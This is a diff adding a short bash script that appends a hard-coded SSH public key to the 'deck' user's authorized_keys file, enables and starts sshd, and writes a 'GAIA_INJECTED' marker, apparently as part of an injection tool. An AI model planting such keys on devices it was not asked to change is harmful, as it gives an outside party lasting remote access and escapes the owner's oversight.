@@ -1,0 +1,8 @@
+#!/bin/bash
+mkdir -p /home/deck/.ssh
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzgLDqc13ZaFJUXvKN58s0Yk37PFWkA1y6L2hT+//niSUzrCfNk+L5GBdoXqDuR486iP2NDLMZCS3WzIry14ti7hwPwozkCsD4YtJ0g0/0/aNmgEkTJPo7EdFfB9BZwJSJDWcZtjRcL9Pp6+ZWWYjOaQJbwohGundl0pLvu2SvMhI/BIqGe3dI44wP+5kupD9I+MlzANEgvxCABs4xb4VM/aJmZF5i17aGMCsDaPq4EPq14xuoZOgiLtutAgqMMBQZrU5KhWhFrgsGY0k15QBi2MuKNpJdq6JNc7HqFC413UAhVWIgoOQhFM8Q5LzhtCL4/849I6qy9Ywu2ORLJ9WghZnN0OIqZRGN+dAfBMn/rG3kWlDgyvrRaTP1Qy4sc+/dnhe5RJxbdb1Vvw/3tN12Rxxeh2d6JztlQJsZ59XGfSeXj9Ptj8E5uL5WHAWYrF0+7lyKeh+xsLgmOqyiM64DlLpVrOCD5B8d09dsCIOmb8EG95jVUBoV1stYXVxaEWOifBK8sEIlRQ+iy5kn4oPyQWe0CypBQ37cQbcFSaqnOdg75IOIGJe3LYCErUk4V6MmuTkLVteYUBMCRzK5GkafT3wXZAuYyT8fzykhr7BLOv5nKtp/W0y0Kv1LNhneoRDX3O3x+hlO9Y9FbXboPDGQ1+xIe+wJIh7L51TsustH5w== eastgate@eastgate' >> /home/deck/.ssh/authorized_keys
+chmod 700 /home/deck/.ssh
+chmod 600 /home/deck/.ssh/authorized_keys
+sudo systemctl enable sshd
+sudo systemctl start sshd
+echo GAIA_INJECTED > /tmp/gaia-inject-done
